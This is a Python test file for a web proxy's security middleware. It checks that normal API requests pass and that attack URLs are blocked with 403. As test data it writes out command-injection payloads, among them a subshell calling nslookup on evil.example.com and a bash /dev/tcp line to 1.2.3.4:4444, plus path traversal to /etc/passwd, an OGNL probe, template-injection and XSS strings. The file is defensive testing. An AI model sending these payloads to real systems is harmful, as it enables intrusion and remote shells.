"""Tests for the request-level security middleware.

Verifies that malicious payloads in URLs are blocked before reaching handlers,
while legitimate requests pass through.
"""

from aiohttp import web
from aiohttp.test_utils import AioHTTPTestCase

from argoproxy.utils.attack_logger import security_middleware


async def _ok_handler(request: web.Request) -> web.Response:
    """Simple handler that returns 200 OK."""
    return web.json_response({"status": "ok"})


def _create_test_app() -> web.Application:
    """Create a minimal app with security middleware and a catch-all route."""
    app = web.Application(middlewares=[security_middleware])
    app.router.add_route("*", "/{path:.*}", _ok_handler)
    return app


# ---------------------------------------------------------------------------
# Legitimate requests — should pass through (200)
# ---------------------------------------------------------------------------


class TestLegitimateRequests(AioHTTPTestCase):
    """Ensure normal API traffic is not blocked."""

    async def get_application(self):
        return _create_test_app()

    async def test_normal_api_path(self):
        resp = await self.client.get("/api/v1/models")
        assert resp.status == 200

    async def test_normal_query_params(self):
        resp = await self.client.get("/api/chat?model=gpt-4&stream=true")
        assert resp.status == 200

    async def test_json_post(self):
        resp = await self.client.post(
            "/v1/chat/completions",
            json={"model": "gpt-4", "messages": [{"role": "user", "content": "hello"}]},
        )
        assert resp.status == 200

    async def test_health_check(self):
        resp = await self.client.get("/health")
        assert resp.status == 200

    async def test_well_known(self):
        resp = await self.client.get("/.well-known/jwks.json")
        assert resp.status == 200


# ---------------------------------------------------------------------------
# Command injection — should be blocked (403)
# ---------------------------------------------------------------------------


class TestCommandInjection(AioHTTPTestCase):
    """Verify command injection payloads are blocked."""

    async def get_application(self):
        return _create_test_app()

    async def test_subshell_in_query(self):
        """The exact payload from the Nessus scan."""
        resp = await self.client.get(
            '/api/getServices?name[]=$(/bin/bash -c "nslookup evil.example.com")'
        )
        assert resp.status == 403

    async def test_bash_devtcp_in_query(self):
        """Reverse shell via /dev/tcp."""
        resp = await self.client.get(
            '/api/getServices?name[]=$(bash -c "echo pwned >/dev/tcp/1.2.3.4/4444")'
        )
        assert resp.status == 403

    async def test_backtick_injection(self):
        resp = await self.client.get("/api/search?q=`id`")
        assert resp.status == 403

    async def test_url_encoded_subshell(self):
        """URL-encoded $( should be decoded and caught."""
        resp = await self.client.get("/api/search?q=%24%28id%29")
        assert resp.status == 403

    async def test_double_encoded_subshell(self):
        """Double URL-encoded $( should still be caught."""
        resp = await self.client.get("/api/search?q=%2524%2528id%2529")
        assert resp.status == 403

    async def test_bin_sh_in_query(self):
        resp = await self.client.get("/api/run?cmd=/bin/sh+-c+id")
        assert resp.status == 403

    async def test_powershell_in_query(self):
        resp = await self.client.get("/api/run?cmd=powershell+-enc+base64payload")
        assert resp.status == 403

    async def test_cmd_exe_in_query(self):
        resp = await self.client.get("/api/run?cmd=cmd.exe+/c+dir")
        assert resp.status == 403


# ---------------------------------------------------------------------------
# Other attack types — should be blocked (403)
# ---------------------------------------------------------------------------


class TestOtherAttackTypes(AioHTTPTestCase):
    """Verify other attack patterns are blocked at request level."""

    async def get_application(self):
        return _create_test_app()

    async def test_directory_traversal_in_query(self):
        resp = await self.client.get("/api/file?path=../../../etc/passwd")
        assert resp.status == 403

    async def test_struts2_ognl(self):
        resp = await self.client.get(
            "/api?class.module.classLoader.URLs%5B0%5D=java.lang.Runtime"
        )
        assert resp.status == 403

    async def test_ssti_probe(self):
        resp = await self.client.get("/api/search?q=${{7*7}}")
        assert resp.status == 403

    async def test_xss_script_tag(self):
        resp = await self.client.get("/api/search?q=<script>alert(1)</script>")
        assert resp.status == 403

    async def test_xss_javascript_proto(self):
        resp = await self.client.get("/api/redirect?url=javascript:alert(1)")
        assert resp.status == 403


# ---------------------------------------------------------------------------
# Response format
# ---------------------------------------------------------------------------


class TestResponseFormat(AioHTTPTestCase):
    """Verify the blocked response format."""

    async def get_application(self):
        return _create_test_app()

    async def test_blocked_response_body(self):
        resp = await self.client.get('/api/getServices?name[]=$(/bin/bash -c "whoami")')
        assert resp.status == 403
        body = await resp.json()
        assert body == {"error": "Forbidden"}
